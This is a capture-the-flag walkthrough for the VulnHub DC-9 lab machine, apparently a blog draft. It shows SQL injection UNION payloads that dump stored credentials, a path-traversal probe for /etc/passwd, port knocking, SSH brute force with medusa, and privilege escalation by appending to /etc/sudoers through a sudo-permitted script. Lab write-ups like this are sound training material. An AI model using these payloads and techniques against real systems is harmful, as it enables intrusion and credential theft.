---
published: false
---
Hello All , This Is my write up for DC: 9 Machine 
Machine Link :https://www.vulnhub.com/entry/dc-9,412/


First we will Make Network Discovery to Discover Machine IP 

- ┌──(root💀Devo)-[/home/devo/vuln-machines/DC-8]
- └─# arp-scan --interface eth0 192.168.162.0/24
- Interface: eth0, type: EN10MB, MAC: 00:0c:29:7b:1a:0c, IPv4: 192.168.162.135
- Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
- 168.162.2	00:50:56:ed:94:06	VMware, Inc.
- 168.162.1	00:50:56:c0:00:08	VMware, Inc.
- **192.168.162.136	00:0c:29:6c:2b:1b	VMware, Inc.**
- 168.162.254	00:50:56:fc:2a:c4	VMware, Inc
.


Machine ip is 192.168.162.136


## Scanning:
- **> _┌──(root💀Devo)-[/home/devo/vuln-machines/DC-8]
- └─#  nmap -sV -p- -sC -A 192.168.162.136                                                                                                                              127 ⨯
- Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-21 20:56 EDT
- Nmap scan report for 192.168.162.136
- Host is up (0.00077s latency).
- Not shown: 65533 closed ports
- PORT   STATE    SERVICE VERSION
- 22/tcp filtered ssh
- 80/tcp open     http    Apache httpd 2.4.38 ((Debian))
- |http-server-header: Apache/2.4.38 (Debian)
- |http-title: Example.com - Staff Details - Welcome
- MAC Address: 00:0C:29:6C:2B:1B (VMware)
- Device type: general purpose
- Running: Linux 3.X|4.X
- OS CPE: cpe:/o:linux:linuxkernel:3 cpe:/o:linux:linuxkernel:4
- OS details: Linux 3.2 - 4.9
- Network Distance: 1 hop
- 
- TRACEROUTE
- HOP RTT     ADDRESS
- 1   0.77 ms 192.168.162.136
- 
- OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ ._
- Nmap done: 1 IP address (1 host up) scanned in 10.42 seconds**


we Found ports SSH , HTTP are open

SSH 
try to connect ssh 
┌──(root💀Devo)-[/home/devo/vuln-machines/DC-8]
└─# ssh 192.168.162.136
The authenticity of host '192.168.162.136 (192.168.162.136)' can't be established.
ECDSA key fingerprint is SHA256:o2Ii/WX152zZCRlVrfXpNnX8mvNwYfOWhkMscAr+sMs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.162.136' (ECDSA) to the list of known hosts.
root@192.168.162.136's password: 
Permission denied, please try again.
root@192.168.162.136's password: 

found we need a password )


HTTP 
we found sql injection in search page 

Tom'-- -
![img1]({{site.baseurl}}/_posts/1.png)



tring to detect columns number to run UNION query...
found that they are 6 columns   ### Tom' ORDER BY 6-- -

trying to collect information from database 

search=Tom' UNION SELECT group_concat(SCHEMA_NAME),2,3,4,5,6 FROM information_schema.schemata-- -
Result: Staff 

search=Tom' UNION SELECT group_concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.tables where table_schema="Staff"-- -
Result = StaffDetails,Users

 search=Tom' UNION SELECT group_concat(COLUMN_NAME),2,3,4,5,6 from information_schema.column where TABLE_SCHEMA="Staff"--
 Result = id,firstname,lastname,position,phone,email,reg_date,UserID,Username,Password


search=Tom' UNION SELECT group_concat(Username,":",Password),2,3,4,5,6 FROM Staff.Users-- -      
Result =  admin:856f5de590ef37314e7c3bdf6f8a66dc  after decoding hash 
### admin:transorbital1****

search=Tom'UNION SELECT group_concat(username,":",password),2,3,4,5,6 from users.UserDetails-- -  
Result =
marym:3kfs86sfd
julied:468sfdfsd2
fredf:4sfd87sfd1
barneyr:RocksOff
tomc:TC&TheBoyz
jerrym:B8m#48sd
wilmaf:Pebbles
bettyr:BamBam01
chandlerb:UrAG0D!
joeyt:Passw0rd
rachelg:yN72#dsd
rossg:ILoveRachel
monicag:3248dsds7s
phoebeb:smellycats
scoots:YR3BVxxxw87
janitor:Ilovepeepee
janitor2:Hawaii-Five-0





Now we Collect Nice Credintials 

We can login to website with  ### admin:transorbital1****

![2]({{site.baseurl}}/_posts/2.png)

### File does not exist
	it seems as hint to parameter called file 
	so we will fuzz it  
    
- └─# wfuzz  -b'PHPSESSID=7iu4vf3td19qtp16374hm8vcdv' --hw 100 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://192.168.162.136/manage.php?FUZZ=../../../../../../../../../../etc/passwd
- 
- 	
- 	
- 	
- 	=====================================================================
- ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
- =====================================================================
- 
- 000000010:   200        93 L     172 W      3694 Ch     "file"

	
	 
we found a paramater mane called file 


![3]({{site.baseurl}}/_posts/3.png)



try to get /proc/sched_debug


![5]({{site.baseurl}}/_posts/5.png)


so we exploit this to read "/proc/sched_debug" and find that knockd service is running 



We have knockdb configuration file   /etc/knockd.conf and send the right sequence packets to make the port open 
you can read about port knocking here :https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu

knockdb configuration
- [openSSH]
- 	sequence    = 7469,8475,9842
- 	seq_timeout = 25
- 	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
- 	tcpflags    = syn
- 
- [closeSSH]
- 	sequence    = 9842,8475,7469
- 	seq_timeout = 25
- 	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
- 	tcpflags    = syn


we will use this sequence to make port open 
- ┌──(root💀Devo)-[/home/devo]
- └─# nc 192.168.162.136 7469                                                                                                                   1 ⨯
- (UNKNOWN) [192.168.162.136] 7469 (?) : Connection refused
-                                                                                                                                                   
- ┌──(root💀Devo)-[/home/devo]
- └─# nc 192.168.162.136 8475                                                                                                                   1 ⨯
- (UNKNOWN) [192.168.162.136] 8475 (?) : Connection refused
-                                                                                                                                                   
- ┌──(root💀Devo)-[/home/devo]
- └─# nc 192.168.162.136 9842                                                                                                                   1 ⨯
- (UNKNOWN) [192.168.162.136] 9842 (?) : Connection refused
-                                                                                                                                                   
- ┌──(root💀Devo)-[/home/devo]
- └─# nc 192.168.162.136 22                                                                                                                     1 ⨯
- SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1


                                                           Now Its Opened 
                                                           
                                                           
 ### SSH Brute force                                                   
                                                           
   - ┌──(root💀Devo)-[/home/devo/vuln-machines/DC-8]
- └─# medusa -C combo -M ssh                                         
- Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
- 
- chandlerb : UrAG0D!
- ACCOUNT FOUND: [ssh] Host: 192.168.162.136 User: janitor Password: Ilovepeepee [SUCCESS]
                                                                                                
                                                                                                                                                                                                                    
we connect to macgine with this cred and Now Booom We get Access                                                         
                                                           

## Privilige Escalation
after we run linpeas.sh we can find
./.secrets-for-putin/passwords-found-on-post-it-notes.txt

- janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
- BamBam01
- Passw0rd
- smellycats
- P0Lic#10-4
- B4-Tru3-001
- 4uGU5T-NiGHts


we add this password to our password List then brute force ssh again 


- medusa -h 192.168.162.136 -U users -P pw -t 6 -M ssh
-  
- ACCOUNT FOUND: [ssh] Host: 192.168.162.136 User: fredf Password: B4-Tru3-001 [SUCCESS]

                 
                 
- fredf@dc-9:~$ sudo -l
- Matching Defaults entries for fredf on dc-9:
-     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
- 
- User fredf may run the following commands on dc-9:
-     (root) NOPASSWD: /opt/devstuff/dist/test/test
- fredf@dc-9:~$ /opt/devstuff/dist/test/test
- Usage: python test.py read append
 
- fredf@dc-9:/opt/devstuff$ cat test.py 
- #!/usr/bin/python
- 
- import sys
- 
- if len (sys.argv) != 3 :
-     print ("Usage: python test.py read append")
-     sys.exit (1)
- 
- else :
-     f = open(sys.argv[1], "r")
-     output = (f.read())
- 
-     f = open(sys.argv[2], "a")
-     f.write(output)
-     f.close()



- fredf@dc-9:/opt/devstuff$ cat /etc/sudoers
- cat: /etc/sudoers: Permission denied
- we couldn't read it but we will put aline to it to allow to sudu any thing


**- fredf@dc-9:/opt/devstuff$ sudo /opt/devstuff/dist/test/test /tmp/sudo-Add  /etc/sudoers**###


- t@dc-9:~$ sudo -l
- 
- We trust you have received the usual lecture from the local System
- Administrator. It usually boils down to these three things:
- 
-     #1) Respect the privacy of others.
-     #2) Think before you type.
-     #3) With great power comes great responsibility.
- 
- [sudo] password for joeyt: 
- Matching Defaults entries for joeyt on dc-9:
-     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
- 
- User joeyt may run the following commands on dc-9:
-     (ALL : ALL) ALL
- joeyt@dc-9:~$ sudo bash
- 'root@dc-9:/home/joeyt#
